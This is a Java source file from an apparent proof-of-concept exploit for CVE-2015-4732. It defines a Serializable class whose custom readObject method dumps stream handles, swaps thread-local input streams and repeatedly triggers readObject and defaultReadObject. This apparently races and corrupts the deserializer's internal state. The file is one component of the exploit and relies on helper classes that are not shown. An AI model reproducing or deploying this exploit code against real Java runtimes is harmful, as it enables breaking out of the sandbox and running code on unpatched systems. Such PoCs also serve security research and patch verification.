package poc.cve_2015_4732;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OptionalDataException;
import java.io.Serializable;

public class DefaultRead implements Serializable {

	private static final long serialVersionUID = -2121368738809677284L;
	
	private void readObject( ObjectInputStream is ) throws IOException, ClassNotFoundException {
		final OIS ois = ( OIS ) is;
		final InputStream oldIS = ThreadLocalIS.INSTANCE.getInputStream();
		
		try {
			Main.HANDLES = Utils.dumpHandles( ois );
			byte[] defaultARARead = Utils.createARADefaultRead( Main.HANDLES );
			
			for( EXTThread extThread : Main.EXT_THREADS ) {
				ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( ByteBuffers.RELEASE_OBJECT ) );
			
				Release.RELEASE_THREAD = extThread;
				try {
					ois.readObject();
				}
				catch( OptionalDataException ode ) {
					break;
				}
				finally {
					Release.RELEASE_THREAD = null;
				}
				
				try {
					ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( defaultARARead ) );
					ois.defaultReadObject();
				}
				catch( Throwable t ) { }
			}
		}
		finally {
			ThreadLocalIS.INSTANCE.setInputStream( oldIS );
		}
	}
	
	private void writeObject( ObjectOutputStream os ) throws IOException { }
	
}
